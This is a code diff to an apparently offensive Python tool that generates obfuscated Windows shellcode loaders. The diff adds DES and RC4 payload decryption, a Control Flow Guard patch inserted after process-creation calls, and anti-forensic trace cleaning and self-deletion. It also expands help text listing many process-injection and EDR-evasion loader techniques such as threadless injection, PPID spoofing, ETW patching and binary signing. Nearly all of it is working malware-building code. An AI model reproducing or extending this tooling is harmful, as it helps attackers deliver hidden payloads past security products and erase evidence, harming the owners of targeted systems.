@@ -159,10 +159,14 @@ def generate_shellcode(input_exe, output_path, shellcode_type, encode=False, enc
             cmd = ['python3', './encoders/bin2aes.py', output_path_bin, '>', encoding_output_path]
         elif encoding == 'aes2':
             cmd = ['python3', './encoders/bin2aes.py', output_path_bin, '>', encoding_output_path]
+        elif encoding == 'des':
+            cmd = ['python3', './encoders/bin2des.py', output_path_bin, '>', encoding_output_path]
         elif encoding == 'chacha':
             cmd = ['python3', './encoders/bin2chacha.py', output_path_bin, '>', encoding_output_path]
         elif encoding == 'ascon':
             cmd = ['python3', './encoders/bin2ascon.py', output_path_bin, '>', encoding_output_path]
+        elif encoding == 'rc4':
+            cmd = ['python3', './encoders/bin2rc4.py', output_path_bin, '>', encoding_output_path]
         subprocess.run(' '.join(cmd), shell=True, check=True)
         output_path = encoding_output_path   
         print(f"[+] Shellcode encoded with {encoding} and saved to: {output_path}")
@@ -242,30 +246,128 @@ def insert_junk_api_calls(content, junk_api, main_func_pattern):
 
     return content
 
-### Self deletion function for output binaries: 
+
+
+### Self_deletion function for output binaries: 
 def insert_self_deletion(content):
-    # Add the include statement for self-deletion at the top of the file
+    """Modifies the given C/C++ source code by injecting a self-deletion function after the ####END#### marker."""
+    
+    # Ensure the include directive is present at the top
     if '#include "self_deletion.h"' not in content:
         content = '#include "self_deletion.h"\n' + content
 
-    # Replace any commented or non-commented version of ####END#### with Perform();
-    placeholder = '####END####'
-    if placeholder in content:
-        # Ensure we remove any comment symbols around the placeholder
-        content = re.sub(r'//\s*####END####', 'perform();', content)  # Remove `//` comments if present
-        content = content.replace(placeholder, 'perform();')  # Replace the placeholder if not commented
-    else:
-        print("Error: '####END####' placeholder not found in the main function.")
+    # Locate the placeholder and insert `perform();` after it
+    lines = content.splitlines()
+    updated_lines = []
+    placeholder_found = False
+
+    for i, line in enumerate(lines):
+        updated_lines.append(line)  # Add the current line as is
+
+        # If we find the placeholder, insert `perform();` after it
+        if re.search(r'//?\s*####END####', line):
+            updated_lines.append('    perform();')  # Insert after, preserving indentation
+            placeholder_found = True
+
+    # Warning if the placeholder was not found
+    if not placeholder_found:
+        print("Warning: '####END####' placeholder not found. Appending 'perform();' at the end.")
+        updated_lines.append('perform();')
+
+    return "\n".join(updated_lines)
+
+
+# Insert anti-forensic function into the template by locating the place holder ####END#### which is placed before the code exeuction. 
+def insert_anti_forensic(content):
+    """Insert anti_forensic() after the ####END#### marker."""
     
+    # Ensure the include directive is present at the top
+    if '#include "anti_forensic.h"' not in content:
+        content = '#include "anti_forensic.h"\n' + content
+
+    # Locate the placeholder and insert `anti_forensic();` after it
+    lines = content.splitlines()
+    updated_lines = []
+    placeholder_found = False
+
+    for i, line in enumerate(lines):
+        updated_lines.append(line)  # Add the current line as is
+
+        # If we find the placeholder, insert `anti_forensic();` after it
+        if re.search(r'//?\s*####END####', line):
+            updated_lines.append('    anti_forensic();')  # Insert with indentation
+            placeholder_found = True
+
+    # Warning if the placeholder was not found
+    if not placeholder_found:
+        print("Warning: '####END####' placeholder not found. Appending 'anti_forensic();' at the end.")
+        updated_lines.append('anti_forensic();')
+
+    return "\n".join(updated_lines)
+
+
+def insert_cfg_patch(content, main_func_pattern):
+    # Add the include statement for CFG patch at the top of the file
+    if '#include "cfg_patch.h"' not in content:
+        content = '#include "cfg_patch.h"\n' + content
+
+    # Find the main function
+    main_match = re.search(main_func_pattern, content, re.MULTILINE)
+    if not main_match:
+        print("Error: Main function not found.")
+        return content
+
+    # Get the portion of the content after the main function starts
+    content_after_main = content[main_match.end():]
+
+    # Find all CreateProcess and OpenProcess function calls
+    create_process_matches = list(re.finditer(r'\b[A-Za-z_]*CreateProcess[A-Za-z_]*\s*\(.*?\)\s*;', content_after_main, re.DOTALL))
+    open_process_matches = list(re.finditer(r'\b[A-Za-z_]*OpenProcess[A-Za-z_]*\s*\(.*?\)\s*;', content_after_main, re.DOTALL))
+
+    # Process matches for CreateProcess and OpenProcess
+    insert_positions = []
+    for match in create_process_matches + open_process_matches:
+        # Get the insert position after the function call (semicolon is included)
+        insert_pos = match.end()
+
+        # Find the process handle used (pi.hProcess or hProcess)
+        handle_pattern = r'\bpi\.hProcess\b|\bhProcess\b'
+        handle_match = re.search(handle_pattern, content_after_main[:insert_pos])
+
+        # Determine which handle to use, or default to pi.hProcess
+        process_handle = handle_match.group(0) if handle_match else "pi.hProcess"
+
+        # Ensure valid insertion after the complete function call
+        insert_positions.append((insert_pos, process_handle))
+
+    if insert_positions:
+        # Insert patchCFG() after each CreateProcess or OpenProcess
+        for insert_pos, process_handle in sorted(insert_positions, reverse=True):
+            # Insert patchCFG outside the function call block
+            cfg_patch_code = f'\n    patchCFG({process_handle});\n    printf("[+] CFG guard disabled.\\n");\n    printf("[+] Press any key to continue\\n");\n    getchar();\n'
+            content_after_main = content_after_main[:insert_pos] + cfg_patch_code + content_after_main[insert_pos:]
+
+        # Reconstruct the content after making the insertions
+        content = content[:main_match.end()] + content_after_main
+    else:
+        # If no CreateProcess or OpenProcess, insert at the beginning of the main function after variable declarations
+        print("No CreateProcess or OpenProcess found. Inserting patchCFG(GetCurrentProcess()) at the beginning of main().")
+        
+        # Insert after the variable declarations in the main function
+        insert_pos = content_after_main.find(';') + 1  # Insert after the first semicolon (end of first declaration)
+        if insert_pos > 0:
+            cfg_patch_code = '\n    patchCFG(GetCurrentProcess());\n    printf("[+] CFG guard disabled.\\n");\n    printf("[+] Press any key to continue\\n");\n    getchar();\n'
+            content_after_main = content_after_main[:insert_pos] + cfg_patch_code + content_after_main[insert_pos:]
+            content = content[:main_match.end()] + content_after_main
+        else:
+            print("Error: Failed to find valid insertion point for CFG patch.")
+
     return content
 
 
 
-
-
-
 # def write_loader(loader_template_path, shellcode, shellcode_file, shellcode_type, output_path, sleep_flag, anti_emulation, junk_api, api_unhooking, god_speed, encoding=None, dream_time=None, file_name=None, etw=False, compile_as_dll=False, compile_as_cpl = False, compile_as_exe = False, compile_as_scr = False, compile_as_sys = False, compile_as_dll = False, compile_as_drv = False, compile_as_ocx = False, compile_as_tlb = False, compile_as_tsp = False, compile_as_msc = False, compile_as_msi = False, compile_as_msp = False, compile_as_mst)
-def write_loader(loader_template_path, shellcode, shellcode_file, shellcode_type, output_path, sleep_flag, anti_emulation, junk_api, api_unhooking, god_speed, encoding=None, dream_time=None, file_name=None, etw=False, compile_as_dll=False, compile_as_cpl = False, star_dust = False, self_deletion=False):
+def write_loader(loader_template_path, shellcode, shellcode_file, shellcode_type, output_path, sleep_flag, anti_emulation, junk_api, api_unhooking, god_speed, encoding=None, dream_time=None, file_name=None, etw=False, compile_as_dll=False, compile_as_cpl = False, star_dust = False, self_deletion=False, anti_forensic=False, cfg=False):
 
     # Adjust loader_template_path for DLL
     if compile_as_dll:
@@ -325,10 +427,14 @@ def write_loader(loader_template_path, shellcode, shellcode_file, shellcode_type
             include_header = '#include "aes_converter.h"\n'
         elif encoding == 'aes2':
             include_header = '#include "aes2_converter.h"\n'
+        elif encoding == 'des':
+            include_header = '#include "des_converter.h"\n'
         elif encoding == 'chacha':
             include_header = '#include "chacha_converter.h"\n'
         elif encoding == 'ascon':
             include_header = '#include "ascon_converter.h"\n'
+        elif encoding == 'rc4':
+            include_header = '#include "rc4_converter.h"\n'
         else:
             # Default to uuid if not specified for backward compatibility
             include_header = '#include "uuid_converter.h"\n'
@@ -455,6 +561,13 @@ def write_loader(loader_template_path, shellcode, shellcode_file, shellcode_type
 
         printf("[+] size of magiccode: %lu bytes\\n", sizeof(magiccode));
         """
+        elif encoding == 'des':
+            encoding_declaration_index = content.find('unsigned char magic_code[]')
+            conversion_logic_template = """
+            size_t magic_len = sizeof(magic_code);
+            unsigned char magiccode[magic_len];
+            int result_des = des_magic(magic_code, magic_len, magiccode);
+        """
         elif encoding == 'chacha':
             encoding_declaration_index = content.find('unsigned char magic_code[]')
             conversion_logic_template = """
@@ -468,6 +581,41 @@ def write_loader(loader_template_path, shellcode, shellcode_file, shellcode_type
 
     // print_decrypted_result(magiccode, lenMagicCode);
     printf("\\n");
+        """
+        elif encoding == 'rc4':
+            encoding_declaration_index = content.find('unsigned char magiccode[]')
+            conversion_logic_template = """
+        //unsigned char magiccode[sizeof(magic_code)];
+        //memcpy(magiccode, magic_code, sizeof(magic_code));
+
+        const char sysfunc32Char[] = { 'S', 'y', 's', 't', 'e', 'm', 'F', 'u', 'n', 'c', 't', 'i', 'o', 'n', '0', '3', '2', 0 };
+        const char advdll[] = { 'a', 'd', 'v', 'a', 'p', 'i', '3', '2', '.', 'd', 'l', 'l', 0 };
+        initialize_keys();
+        initialize_data((unsigned char*)magiccode, sizeof(magiccode));
+        
+        sysfunc32 = (SystemFunction032_t)GetProcAddress(LoadLibrary(advdll), sysfunc32Char);
+        NTSTATUS eny = sysfunc32(&pData, &pKey);
+  
+        if(eny != STATUS_SUCCESS) {
+            printf("[-] sysfunc32 failed to decrypt the data. Status: %x\\n", eny);
+        } else {
+            printf("[+] sysfunc32 succeeded to decrypt the data.\\n");
+        }
+
+        // sanity check
+        // Print first and last 10 bytes of magiccode
+        printf("magiccode (first 10 bytes): ");
+        for (int i = 0; i < 10; i++) {
+            printf("%02X ", ((unsigned char*)pData.Buffer)[i]);
+        }
+        printf("\\n");
+
+        printf("magiccode (last 10 bytes): ");
+        for (int i = (pData.Length - 10); i < pData.Length; i++) {
+            printf("%02X ", ((unsigned char*)pData.Buffer)[i]);
+        }
+        printf("\\n");
+
         """
         elif encoding == 'ascon':
             encoding_declaration_index = content.find('unsigned char magic_code[]')
@@ -553,6 +701,12 @@ def write_loader(loader_template_path, shellcode, shellcode_file, shellcode_type
     if (encoding == None):
         content = content.replace('####SHELLCODE####', shellcode)
 
+
+    # Check if -cfg flag is provided to disable CFG
+    if cfg:
+        print("[+] Control Flow Guard (CFG) disabling is enabled.\n")
+        content = insert_cfg_patch(content, main_func_pattern)
+
     if anti_emulation:
         content = '#include "anti_emu.h"\n' + content
 
@@ -635,6 +789,10 @@ def write_loader(loader_template_path, shellcode, shellcode_file, shellcode_type
     if self_deletion:
         content = insert_self_deletion(content)
 
+    if anti_forensic: 
+        content = insert_anti_forensic(content)
+
+
     # Write to the new loader file
     with open(output_path, 'w') as file:
         file.write(content)
@@ -660,7 +818,7 @@ def run_obfuscation(loader_path):
             os.rename(patch_file, obf_file)
 
 
-def compile_output(loader_path, output_name, compiler, sleep_flag, anti_emulation, insert_junk_api_calls, api_unhooking=False, mllvm_options=None, god_speed=False, encoding=None, loader_number=1, dream=None, etw=False, compile_as_dll=False, compile_as_cpl = False, self_deletion=False):
+def compile_output(loader_path, output_name, compiler, sleep_flag, anti_emulation, insert_junk_api_calls, api_unhooking=False, mllvm_options=None, god_speed=False, encoding=None, loader_number=1, dream=None, etw=False, compile_as_dll=False, compile_as_cpl = False, self_deletion=False, anti_forensic=False, cfg=False, icon=False):
 
     
     # Find the latest MinGW directory
@@ -678,7 +836,7 @@ def compile_output(loader_path, output_name, compiler, sleep_flag, anti_emulatio
         print("Error: No x86_64-w64-mingw32 directory found.")
         sys.exit(1)
 
-    if loader_number in [1, 39, 40, 41]:
+    if loader_number in [1, 39, 40, 41, 66]:
         try:
             subprocess.run(['nasm', '-f', 'win64', 'assembly.asm', '-o', 'assembly.o'], check=True)
             print("[+] NASM assembly compilation successful.")
@@ -714,7 +872,7 @@ def compile_output(loader_path, output_name, compiler, sleep_flag, anti_emulatio
         #                    '-target', 'x86_64-w64-mingw32', loader_path,
         #                    '-o', output_name, '-v', '-L/usr/lib/gcc/x86_64-w64-mingw32/12-win32',
         #                    '-L./clang_test_include', '-I./c++/', '-I./c++/mingw32/']
-        compile_command = ['./llvm_obfuscator_pluto/bin/clang++', '-I.', '-I./converter', '-I./evader', '-O3', '-flto', '-fuse-ld=lld',
+        compile_command = ['./llvm_obfuscator_pluto/bin/clang++', '-I.', '-I./converter', '-I./evader', '-O1', '-flto', '-fuse-ld=lld',
                         '-mllvm', f'-passes={mllvm_passes}',
                         '-Xlinker', '-mllvm', '-Xlinker', '-passes=hlw,idc',
                         '-target', 'x86_64-w64-mingw32', '-I.', '-I./converter', '-I./evader', loader_path]
@@ -774,8 +932,12 @@ def compile_output(loader_path, output_name, compiler, sleep_flag, anti_emulatio
         compile_command.append('./converter/aes_converter.c')
     elif encoding == 'chacha':
         compile_command.append('./converter/chacha_converter.c')
+    elif encoding == 'rc4':
+        compile_command.append('./converter/rc4_converter.c')
     elif encoding == 'aes2':
         compile_command.append('./converter/aes2_converter.c')
+    elif encoding == 'des':
+        compile_command.append('./converter/des_converter.c')
     elif encoding == 'ascon':
         compile_command.append('./converter/ascon_converter.c')
     if dream:
@@ -790,18 +952,27 @@ def compile_output(loader_path, output_name, compiler, sleep_flag, anti_emulatio
         compile_command.append('./evader/api_untangle.c')
     if self_deletion:
         compile_command.append('./evader/self_deletion.c')
+    if anti_forensic:
+        compile_command.append('./evader/anti_forensic.c')
     compile_command.append('-static-libgcc')
     compile_command.append('-static-libstdc++')
     compile_command.append('-lole32')
     if loader_number == 33: 
         compile_command.append('./syscall.c')
         compile_command.append('assembly.o')
-    if loader_number in [1, 39, 40, 41]:
+    if loader_number in [1, 39, 40, 41, 66]:
 
         compile_command.append('assembly.o')
         compile_command.append('-luuid')
-    if loader_number in [37, 38, 48, 49, 51, 52, 56, 58, 59, 60, 61, 62, 63, 64, 65]:
+    if loader_number in [37, 38, 48, 49, 51, 52, 56, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 76]:
         compile_command.append('./evader/pebutils.c')
+    if cfg:
+        compile_command.append('./evader/cfg_patch.c')
+    ## add icon.res file to the compilation command
+    if icon:
+        compile_command.append('icon.res')
+        compile_command.append('-mwindows')
+
         
 
     try:
@@ -813,7 +984,7 @@ def compile_output(loader_path, output_name, compiler, sleep_flag, anti_emulatio
         print(f"[-] Compilation failed: {e}")
 
 
-def compile_with_syswhisper(loader_path, output_name, syswhisper_option, sleep_flag, anti_emulation, insert_junk_api_calls, compiler, api_unhooking, god_speed=False, encoding=None, dream=None, etw=False, self_deletion=False):
+def compile_with_syswhisper(loader_path, output_name, syswhisper_option, sleep_flag, anti_emulation, insert_junk_api_calls, compiler, api_unhooking, god_speed=False, encoding=None, dream=None, etw=False, self_deletion=False, anti_forensic=False, cfg=False):
     # Create output directory if it doesn't exist
     output_dir = os.path.dirname(output_name)
     if not os.path.exists(output_dir):
@@ -826,6 +997,10 @@ def compile_with_syswhisper(loader_path, output_name, syswhisper_option, sleep_f
         additional_sources.extend(['./evader/anti_emu.c', '-lws2_32', '-lpsapi', '-lole32'])
     if self_deletion:
         compile_command.append('./evader/self_deletion.c')
+    if anti_forensic:
+        compile_command.append('./evader/anti_forensic.c')
+    if cfg:
+        compile_command.append('./evader/cfg_patch.c')
     if etw:
         additional_sources.append('./evader/etw_pass.c')
     ## TODO: Add support for other encoding types
@@ -848,12 +1023,14 @@ def compile_with_syswhisper(loader_path, output_name, syswhisper_option, sleep_f
             additional_sources.append('./converter/aes_converter.c')
         elif encoding == 'chacha':
             additional_sources.append('./converter/chacha_converter.c')
-        elif encoding == 'aes2':
-            additional_sources.append('./converter/aes2_converter.c')
-        elif encoding == 'ascon':
-            additional_sources.append('./converter/ascon_converter.c')
         elif encoding == 'rc4':
             additional_sources.append('./converter/rc4_converter.c')
+        elif encoding == 'aes2':
+            additional_sources.append('./converter/aes2_converter.c')
+        elif encoding == 'des':
+            additional_sources.append('./converter/des_converter.c')
+        elif encoding == 'ascon':
+            additional_sources.append('./converter/ascon_converter.c')
     if dream:
         additional_sources.append('./evader/sleep_encrypt.c')
     if god_speed:
@@ -877,7 +1054,7 @@ def compile_with_syswhisper(loader_path, output_name, syswhisper_option, sleep_f
         subprocess.run(compile_command, check=True)
     elif compiler == "pluto":
         # Pluto-specific compilation command
-        compile_command = ["./llvm_obfuscator_pluto/bin/clang++", '-I.', '-I./converter', '-I./evader', "-fms-extensions", "-D", "nullptr=NULL", "-O3", "-flto", "-fuse-ld=lld",
+        compile_command = ["./llvm_obfuscator_pluto/bin/clang++", '-I.', '-I./converter', '-I./evader', "-fms-extensions", "-D", "nullptr=NULL", "-O1", "-flto", "-fuse-ld=lld",
                            "-mllvm", "-passes=mba,sub,idc,bcf,fla,gle", "-Xlinker", "-mllvm", "-Xlinker", "-passes=hlw,idc",
                            "-target", "x86_64-w64-mingw32", loader_path, "./classic_stubs/syscalls.c", "./classic_stubs/syscallsstubs.std.x64.s", "-o", output_name, "-v",
                            f"-L{mingw_dir}", "-L./clang_test_include", "-I./c++/", "-I./c++/mingw32/"] + additional_sources
@@ -1050,7 +1227,7 @@ def main():
     12. [Your custom loader here]
     14. Exit the process without executing the injected shellcode
     15. Syswhispers2 classic native API calls
-    16. Classic userland API calls (VirtualAllcEx --> WriteProcessMemory --> Cre-ateRemoteThread)
+    16. Classic userland API calls (VirtualAllcEx --> WriteProcessMemory --> CreateRemoteThread)
     17. Sifu SysCall with Divide and Conquer
     18. Classic userland API calls with WriteProcessMemoryAPC
     19. DLL overloading 
@@ -1062,7 +1239,7 @@ def main():
     25.
     26. Stealth new Injection (3 WriteProcessMemoryAPC variants + custom DLL overloading + custom dynamic API-hashing)
     27. Stealth new Injection (3 Custom WriteProcessMemoryAPC variants + custom DLL overloading + custom dynamic API-hashing + Halo's gate patching)
-    28. Improved version of Halo's gate patching syscall injection + Custom write code to Process Memory by either MAC or UUID convertor + invisible dynamic loading (no loadModuleHandle, loadLibrary, GetProcessAddress)
+    28. Halo's gate patching syscall injection + Custom write code to Process Memory by either MAC or UUID convertor + invisible dynamic loading (no loadModuleHandle, loadLibrary, GetProcessAddress)
     31. MAC address injection
     32. Stealth new injection (Advanced)
     33. Indirect Syscall + Halo gate + Custom Call Stack
@@ -1079,15 +1256,24 @@ def main():
     54. Stealth new loader + Exception handler + Syscall breakpoints handler with memory guard evasion AKA Sifu breakpoint handler (hook on ntdll!RtlUserThreadStart and kernel32!BaseThreadInitThunk, with Decoy address, PAGE_NOACCESS and XOR)
     56. This is a fork of Loader 37 with additional features. If -ldr flag is not provided, loader will add module (contains the shellcode) to the PEB module lists manually using code from Dark library. 
     57. A fork of loader 51 with XOR replaced with RC4 encryption offered by SystemFunction032/033.
-    58. New loader in progress.
-    59. New loader in progress.
-    60. New loader in progress.
-    61. New loader in progress.
+    58. VEH add hanlder. Add ROP Trampoliine to the kernel32!BaseThreadInitThunk for additional complexity to analyse. 
+    59. SEH add hanlder. Add ROP Trampoliine to the kernel32!BaseThreadInitThunk for additional complexity to analyse.
+    60. Use Page guard to trigger first exception to set debug registers without using NtGetContextThread --> NtSetContextThread
+    61. Use Page guard to trigger first exception to set debug registers without using NtGetContextThread --> NtSetContextThread + Use VEH to set up breakpoints Dr0~Dr3, Dr7. Then use VCH to execute the code. So, no registers and stack pointer and instruction pointer changed in VEH. 
     62. New loader in progress.
-    63. New loader in progress.
-    64. New loader in progress.
-    65. New loader in progress.
+    63. Remote version of custom module loading loader 37. Remote module injection.
+    64.
+    65. Advanced VMT hooking with custom module loader 37. 
+    66. A fork of L-65, with additional features such as optional PPID spoofing, multiple shellcode and DLL injection mitigation policies enabled on remote process.
+    67. A fork of L-65, with strange trampoline code to execute the magic code in both local and remote process. 
+    68. New loader in progress.
+    69. A fork of L-61, manually set VEH and VCH and clean ups by remove the CrossProcessFlags from TEB->PEB.
+    ...
+    73. VT Pointer threadless process injection, can be invoked with decoy address to any function or triggered by injected application (e.g. explorer). Memory guard available with RC4 entryption and PAGE_NOACCESS.
+    74. VT Pointer threadless process injection, can be invoked with decoy address to any function or triggered by injected application (e.g. explorer). Memory guard available with RC4 entryption and PAGE_NOACCESS. The VirtualProtect is being called within pretext.
 
+    75. Dotnet JIT threadless process injection. 
+    76. Module List PEB Entrypoint threadless process injection. 
      """
 
     def check_non_negative(value):
@@ -1118,6 +1304,10 @@ def main():
 
     parser.add_argument('-sleep', action='store_true', help='Obfuscation Sleep flag with random sleep time (True or False)')
     parser.add_argument('-a', '--anti-emulation', action='store_true', help='Anti-emulation flag (True or False)')
+
+    parser.add_argument('-cfg', '--control-flow-guard', action='store_true', help='Disable Control Flow Guard (CFG) for the loader template.')
+
+
     parser.add_argument('-etw', action='store_true', help='Enable ETW patching functionality')
 
     parser.add_argument('-j', '--junk-api', action='store_true', help='Insert junk API function call at a random location in the main function (5 API functions)')
@@ -1136,7 +1326,7 @@ def main():
     parser.add_argument('-sgn', '--encode-sgn', action='store_true', help='Encode the generated shellcode using sgn tool.')
 
     ## TODO: Add support for other encoding types
-    parser.add_argument('-e', '--encoding', choices=['uuid', 'xor', 'mac', 'ipv4', 'base45', 'base64', 'base58', 'aes', 'chacha', 'aes2', 'ascon'], help='Encoding type: uuid, xor, mac, ip4, base64, base58 AES and aes2. aes2 is a devide and conquer AES decryption to bypass logical path hijacking. Other encoders are under development. ')
+    parser.add_argument('-e', '--encoding', choices=['uuid', 'xor', 'mac', 'ipv4', 'base45', 'base64', 'base58', 'aes', 'des', 'chacha', 'rc4', 'aes2', 'ascon'], help='Encoding type: uuid, xor, mac, ip4, base45, base64, base58, AES, DES, chacha, RC4 and aes2. aes2 is a devide and conquer AES decryption to bypass logical path hijacking. Other encoders are under development. ')
 
 
     parser.add_argument('-c', '--compiler', default='mingw', choices=['mingw', 'pluto', 'akira'], help='Compiler choice: mingw (default), pluto, or akira')
@@ -1159,10 +1349,18 @@ def main():
     ### need a -d --self-deletion argument where the binary deletes itself after execution, it should be False by default:
     parser.add_argument('-d', '--self-deletion', action='store_true', help='Enable self-deletion of the binary after execution')
 
+    ### need a -af --anti-forensic argument, it should be False by default:
+    parser.add_argument('-af', '--anti-forensic', action='store_true', help='Enable anti-forensic functions to clean the execution traces.')
+    parser.add_argument('-icon', action='store_true', help='Enable icon for the output binary.')
+
 
     parser.add_argument('-s', '--sign-certificate', nargs='?', const='ask_user', 
                         help='Optional: Sign the output binary and copy metadata from another binary to your output. If a website or filepath is provided, use it. Defaults to interactive mode if no argument is provided.')
 
+
+    ### todo: consider add another post-compiled obfuscation from BH Europe 24 here: 
+    # ./notpacked++ alice_notepad.exe --raw-size --fill-sections --rename-sections
+    # Above, only those 3 options can be used, another option will corrupt the binary. 
 
     args = parser.parse_args()
 
@@ -1253,7 +1451,7 @@ def main():
     ##print the args.encoding:
     # print(f"using encoding option: {args.encoding}")
     # write_loader(template_loader_path, shellcode, shellcode_file, args.shellcode_type, output_loader_path, args.sleep, args.anti_emulation, args.junk_api, args.api_unhooking, args.god_speed, args.encoding)
-    write_loader(template_loader_path, shellcode, shellcode_file, args.shellcode_type, output_loader_path, args.sleep, args.anti_emulation, args.junk_api, args.api_unhooking, args.god_speed, args.encoding, args.dream, file_name, args.etw, compile_as_dll=args.dll, compile_as_cpl=args.cpl, star_dust = args.star_dust, self_deletion=args.self_deletion)
+    write_loader(template_loader_path, shellcode, shellcode_file, args.shellcode_type, output_loader_path, args.sleep, args.anti_emulation, args.junk_api, args.api_unhooking, args.god_speed, args.encoding, args.dream, file_name, args.etw, compile_as_dll=args.dll, compile_as_cpl=args.cpl, star_dust = args.star_dust, self_deletion=args.self_deletion, anti_forensic=args.anti_forensic, cfg=args.control_flow_guard)
 
     if args.obfuscate:
         print("Obfuscating the loader code...\n")
@@ -1276,9 +1474,9 @@ def main():
     ##print the output_file_path
     print(f"Output file path: {output_file_path}")
     if use_syswhisper:
-        compile_with_syswhisper(obfuscated_loader_path, output_file_path, args.syswhisper if args.syswhisper is not None else 1, args.sleep, args.anti_emulation, args.junk_api, args.compiler, args.api_unhooking, args.god_speed, args.encoding, args.dream, args.etw, args.self_deletion)
+        compile_with_syswhisper(obfuscated_loader_path, output_file_path, args.syswhisper if args.syswhisper is not None else 1, args.sleep, args.anti_emulation, args.junk_api, args.compiler, args.api_unhooking, args.god_speed, args.encoding, args.dream, args.etw, args.self_deletion, args.anti_forensic, cfg=args.control_flow_guard)
     else:
-        compile_output(obfuscated_loader_path, output_file_path, args.compiler, args.sleep, args.anti_emulation, args.junk_api, args.api_unhooking, args.mllvm, args.god_speed, args.encoding, args.loader, args.dream, args.etw, args.dll, args.cpl, args.self_deletion)
+        compile_output(obfuscated_loader_path, output_file_path, args.compiler, args.sleep, args.anti_emulation, args.junk_api, args.api_unhooking, args.mllvm, args.god_speed, args.encoding, args.loader, args.dream, args.etw, args.dll, args.cpl, args.self_deletion, args.anti_forensic, cfg=args.control_flow_guard, icon=args.icon)
 
 
 
